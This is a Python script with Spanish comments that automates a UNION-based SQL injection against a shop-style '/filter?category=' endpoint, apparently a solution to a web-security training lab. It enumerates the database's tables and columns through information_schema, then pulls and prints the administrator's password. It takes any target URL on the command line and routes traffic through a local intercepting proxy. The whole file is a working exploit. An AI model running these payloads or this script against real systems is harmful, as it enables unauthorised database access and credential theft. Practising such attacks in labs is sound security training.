import requests
import sys
from bs4 import BeautifulSoup
import re
import urllib3

# Desactivar advertencias de seguridad para solicitudes HTTPS no verificadas.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuración de proxies (podría moverse a un archivo de configuración)
PROXIES = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def perform_request(url, sql_payload):
    """
    Realiza una solicitud GET al URL proporcionado con el payload SQL.
    """
    path = '/filter?category=Accessories'
    full_url = f"{url}{path}{sql_payload}"
    try:
        response = requests.get(full_url, verify=False, proxies=PROXIES)
        response.raise_for_status()  # Verificar que la respuesta sea exitosa (HTTP 200)
        return response.text
    except requests.RequestException as e:
        print(f"Error al realizar la solicitud: {e}")
        return ""

def sqli_users_table(url):
    """
    Busca en la base de datos el nombre de la tabla que contiene a los usuarios.
    """
    sql_payload = "' UNION SELECT table_name, NULL FROM information_schema.tables--"
    response_text = perform_request(url, sql_payload)
    if not response_text:
        return None
    soup = BeautifulSoup(response_text, 'html.parser')
    users_table = soup.find(string=re.compile('.*users.*'))
    return users_table

def sqli_users_columns(url, users_table):
    """
    Identifica los nombres de las columnas de la tabla de usuarios.
    """
    sql_payload = f"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = '{users_table}'--"
    response_text = perform_request(url, sql_payload)
    soup = BeautifulSoup(response_text, 'html.parser')
    username_column = soup.find(string=re.compile('.*username.*'))
    password_column = soup.find(string=re.compile('.*password.*'))
    return username_column, password_column

def sqli_administrator_cred(url, users_table, username_column, password_column):
    """
    Obtiene las credenciales del administrador a partir de los nombres de las columnas y la tabla.
    """
    sql_payload = f"' UNION SELECT {username_column}, {password_column} FROM {users_table}--"
    response_text = perform_request(url, sql_payload)
    soup = BeautifulSoup(response_text, 'html.parser')
    admin_password = soup.body.find(string="administrator").parent.findNext('td').contents[0]
    return admin_password

def main():
    if len(sys.argv) < 2:
        print(f"[-] Uso: {sys.argv[0]} <url>")
        print(f"[-] Ejemplo: {sys.argv[0]} www.example.com")
        return
    
    url = sys.argv[1].strip()

    print("Buscando la tabla de usuarios...")
    users_table = sqli_users_table(url)
    if users_table:
        print(f"Nombre de la tabla de usuarios encontrada: {users_table}")
        username_column, password_column = sqli_users_columns(url, users_table)
        if username_column and password_column:
            print(f"Nombre de la columna de usuario encontrada: {username_column}")
            print(f"Nombre de la columna de contraseña encontrada: {password_column}")
            
            # Aquí llamamos a la función para obtener la contraseña del administrador
            admin_password = sqli_administrator_cred(url, users_table, username_column, password_column)
            if admin_password:
                # Imprimimos el usuario y la contraseña del administrador
                print(f"[+] Credenciales de administrador encontradas: usuario 'administrator', contraseña '{admin_password}'")
            else:
                print("[-] No se encontró la contraseña del administrador.")
        else:
            print("[-] No se encontraron las columnas de usuario y/o contraseña.")
    else:
        print("[-] No se encontró la tabla de usuarios.")

if __name__ == "__main__":
    main()

